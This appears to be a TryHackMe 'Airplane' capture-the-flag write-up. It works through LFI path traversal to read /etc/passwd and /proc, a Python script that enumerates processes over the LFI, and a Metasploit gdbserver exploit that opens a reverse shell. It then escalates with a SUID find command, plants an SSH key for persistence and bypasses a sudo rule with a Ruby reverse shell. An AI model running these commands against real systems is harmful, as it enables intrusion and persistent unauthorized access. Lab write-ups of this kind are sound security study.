---
title: "TryHackMe - Airplane"
date: 2025-06-09 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [privilege escalation, GTFOBins, reverse shell, ruby, path traversal, gdbserver, LFI, python, /proc/self, ssh   ]
---


## Reconnaissance

As always, I began with reconnaissance. My first step was a full TCP port scan using nmap to enumerate open services on the target machine:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV -T4 -p- -A 10.10.178.238
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-09 06:22 EDT
Nmap scan report for 10.10.178.238
Host is up (0.060s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
|_  256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
6048/tcp open  x11?
8000/tcp open  http    Werkzeug httpd 3.0.2 (Python 3.8.10)
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   59.48 ms 10.23.0.1
2   59.58 ms 10.10.178.238

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 229.73 seconds

```
Nmap Results
The scan revealed the following open ports:

- 22/tcp - OpenSSH 8.2p1 (Ubuntu)

- 6048/tcp - Unknown service

- 8000/tcp - Werkzeug HTTP server (Python 3.8)

The web service on port 8000 caught my attention, especially since it returned a header pointing to a custom domain: http://airplane.thm:8000/?page=index.html.

To resolve the domain locally, I added an entry to my `/etc/hosts` file:


## Investigating the Web Service

After visiting the site, it looked like a simple static page. However, I noticed that the URL parameter `page=index.html` might be injectable. I decided to test for Local File Inclusion (LFI) by modifying the parameter to reference `/etc/passwd`:

```
http://airplane.thm:8000/?page=../../../../etc/passwd
```

It worked — I successfully dumped the contents of `/etc/passwd`. This confirmed the LFI vulnerability.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
fwupd-refresh:x:122:127:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
geoclue:x:123:128::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:129:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:127:132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hudson:x:1001:1001::/home/hudson:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
```

From the output, two user accounts stood out: `carlos` and `hudson`.

## Digging Deeper with LFI

To gain further insights into the running environment, I used Burp Suite to send a request for `/?&page=../../../../../proc/self/environ`

![1](/images/airplane/1.jpg)

```
GET /?page=../../../../../proc/self/environ HTTP/1.1
```
This file contains environment variables for the current process, which often reveals server configuration or temporary credentials. I found nothing useful there, but another file caught my attention: `/proc/self/cmdline`.

By accessing:

```
/?&page=../../../../../proc/self/cmdline
```

I discovered the server was running:

```
/usr/bin/python3app.py
```

So the web app was a Python script, not a compiled binary or framework-based service.

## Enumerating Processes via LFI

I wrote a Python script to enumerate running processes on a remote server vulnerable to Local File Inclusion (LFI). The goal was to identify which process is bound to a specific network port (in my case, port 6048) by leveraging the LFI vulnerability to access the /proc filesystem.

```python
import requests
import sys
import time

BASE_URL = "http://airplane.thm:8000/?page=../../../../../proc"

def get_cmdline(pid):
    url = f"{BASE_URL}/{pid}/cmdline"
    try:
        r = requests.get(url, timeout=3)
        if r.status_code == 200:
            text = r.text
            if "Page not found" not in text:
                # replace null chars with space
                return text.replace('\x00', ' ').strip()
    except requests.RequestException:
        pass
    return None

def main():
    for pid in range(1, 1001):
        # print progress on same line
        print(f"\rChecking PID {pid}...", end="", flush=True)
        cmdline = get_cmdline(pid)
        if cmdline:
            print(f"\r{pid} : {cmdline}")
        # optional: small delay to not spam too fast
        # time.sleep(0.01)
    print("\nDone.")

if __name__ == "__main__":
    main()

```


Since the `/proc` filesystem contains a directory for each running process (named by its PID), and inside each directory there is a file called cmdline that holds the exact command used to start the process, I decided to iterate through possible PIDs and retrieve their cmdline files.

The script constructs a URL for each PID, targeting the vulnerable page parameter to read the file `/proc/[PID]/cmdline`. It then sends an HTTP GET request to the server. If the file exists and is accessible, the server returns the contents of that file, which I clean up by replacing null bytes with spaces for readability.

By printing the PID alongside its command line, I can visually scan for any processes related to my target port. For example, if I see a process whose command line mentions the `port number 6048` or an application typically known to bind that port, I can identify the service running there.

This approach is practical because directly mapping ports to processes through `/proc/net/tcp`and matching inodes via LFI would be more complex and require additional steps that may not be feasible or efficient through LFI.

In summary, I leveraged the predictable structure of the Linux /proc filesystem and the LFI vulnerability to enumerate running processes and infer which one corresponds to the network service listening on the port of interest which is 

```
529 : /usr/bin/gdbserver 0.0.0.0:6048 airplane

```

## Exploiting gdbserver


Knowing that gdbserver was running, I opened **Metasploit** and searched for available exploits:

```console
msf6 > search gdb

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/multi/gdb/gdb_server_exec               2014-08-24       great      No     GDB Server Remote Payload Execution
   1    \_ target: x86                                .                .          .      .
   2    \_ target: x86_64                             .                .          .      .
   3    \_ target: ARMLE                              .                .          .      .
   4    \_ target: AARCH64                            .                .          .      .
   5  exploit/linux/local/ptrace_sudo_token_priv_esc  2019-03-24       excellent  Yes    ptrace Sudo Token Privilege Escalation

```

The module I chose is `exploit/multi/gdb/gdb_server_exec`.
This exploit allows for remote code execution via an open **gdbserver**. I selected the correct target architecture (x86_64):

```
msf6 exploit(multi/gdb/gdb_server_exec) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   x86
    1   x86_64
    2   ARMLE
    3   AARCH64


msf6 exploit(multi/gdb/gdb_server_exec) > set TARGET 1
TARGET => 1
```
```
sf6 exploit(multi/gdb/gdb_server_exec) > set payload linux/x64/shell_reverse_tcp
payload => linux/x64/shell_reverse_tcp
msf6 exploit(multi/gdb/gdb_server_exec) > run
[*] Started reverse TCP handler on 10.23.106.242:4444 
[*] 10.10.173.15:6048 - Performing handshake with gdbserver...
[*] 10.10.173.15:6048 - Stepping program to find PC...
[*] 10.10.173.15:6048 - Writing payload at 00007ffff7fd0df5...
[*] 10.10.173.15:6048 - Executing the payload...
[*] Command shell session 1 opened (10.23.106.242:4444 -> 10.10.173.15:36302) at 2025-06-10 12:49:22 -0400

shell
[*] Trying to find binary 'python' on the target machine
[-] python not found
[*] Trying to find binary 'python3' on the target machine
[*] Found python3 at /usr/bin/python3
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /usr/bin/bash
whoami
whoami
hudson
hudson@airplane:/opt$ 
```

I now had a shell as the user `hudson`.

## Privilege Escalation

To escalate privileges, I looked for SUID binaries on the system:

```console

hudson@airplane:/home/hudson$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/find
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/su
/usr/bin/vmware-user-suid-wrapper
/usr/bin/mount
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/snap/snapd/18357/usr/lib/snapd/snap-confine
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
hudson@airplane:/home/hudson$ 

```

To check if the find binary could be abused, I referred to [GTFOBins], a handy resource that lists known privilege escalation techniques using common binaries.

I found that if `find` has the SUID bit set, it can be exploited to spawn a root shell like this. So i tried it

```
find . -exec /bin/sh -p \; -quit
```

This granted me a shell running as the user `carlos`. With access to `carlos`, I moved to their home directory and captured the first flag:

```
find . -exec /bin/sh -p \; -quit
$ whoami
whoami
carlos
$ cd /home/carlos
cd /home/carlos
$ ls
ls
Desktop    Downloads  Pictures  Templates  user.txt
Documents  Music      Public    Videos
$ cat user.txt
cat user.txt
eebfca2ca5a2b8a56c46c781aeea7562
$ 

```

# SSH Access as carlos

To make persistence and further steps easier, I added my SSH public key to carlos’s account.

On my Kali machine, I copied the contents of my public key:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ cat /home/kali/.ssh/id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEb2nYCbJxhxV+hNepGV1nB0vOewtoF+32xY62Xch1/J kali@kali
```

Then, on the target machine (as carlos), I created or edited the `authorized_keys` file in `/home/carlos/.ssh` directory

```bash
cd /home/carlos/.ssh
touch authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEb2nYCbJxhxV+hNepGV1nB0vOewtoF+32xY62Xch1/J kali@kali" >> authorized_keys
```

Now, from my local machine, I could SSH directly into the target as carlos:


```console
─(kali㉿kali)-[~/Desktop]
└─$ ssh carlos@airplane.thm     
Enter passphrase for key '/home/kali/.ssh/id_ed25519': 
Enter passphrase for key '/home/kali/.ssh/id_ed25519': 
Enter passphrase for key '/home/kali/.ssh/id_ed25519': 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Your Hardware Enablement Stack (HWE) is supported until April 2025.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

carlos@airplane:~$ 

```

## Root Access via Misconfigured `sudo` and Ruby

After gaining access to the user `carlos` - and setting up SSH access for persistence - I began looking for ways to escalate privileges to root. A great first step in this process is checking the current user's sudo permissions using:

```console
carlos@airplane:~$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

The output revealed a very interesting misconfiguration:

```
User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

This meant I could execute any Ruby script located under `/root/` as root—without providing a password.

Instead of trying to write directly into `/root`, I used a trick with relative paths. I created a reverse shell Ruby script inside carlos’s home directory:

```bash
nano /home/carlos/shell.rb
```

[Here’s](https://gist.github.com/gr33n7007h/c8cba38c5a4a59905f62233b36882325) the payload I used, replacing the IP and port with my own:


I executed the Ruby script with sudo, using relative path traversal to bypass the /root/*.rb restriction:

```
carlos@airplane:~$ sudo /usr/bin/ruby /root/../home/carlos/shell.rb
```

My netcat listener caught the incoming connection. I now had a root shell.

```
# whoami
root
# cd /root
# ls
root.txt
snap
# cat root.txt
190dcbeb688ce5fe029f26a1e5fce002
# 
```








